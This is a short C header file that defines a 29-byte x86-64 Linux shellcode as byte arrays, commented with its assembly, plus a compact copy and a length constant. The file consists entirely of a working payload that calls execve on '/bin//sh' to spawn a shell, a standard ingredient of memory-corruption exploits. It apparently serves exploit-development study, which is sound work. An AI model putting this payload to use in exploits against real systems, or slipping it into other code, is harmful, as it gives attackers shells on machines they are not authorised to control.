#ifndef HASH_SHELLCODE_H
#define HASH_SHELLCODE_H

const char code[] =
		"\x6a\x3b" //push 59
		"\x58" //pop %rax
		"\x48\x31\xff" // xor    %rdi,%rdi
		"\x57" //   push   %rdi
		"\x48\xbf\x2f\x62\x69\x6e\x2f"// movabs $0x68732f2f6e69622f,%rdi
		"\x2f\x73\x68"
		"\x57" // push   %rdi
		"\x48\x89\xe7"  // mov    %rsp,%rdi
		"\x48\x31\xf6" // xor    %rsi,%rsi
		"\x48\x31\xd2" //xor    %rdx,%rdx
		"\x0f\x05"// syscall
;

const char compact[] = "\x6a\x3b\x58\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05";

const unsigned char length = 29;

#endif //HASH_SHELLCODE_H
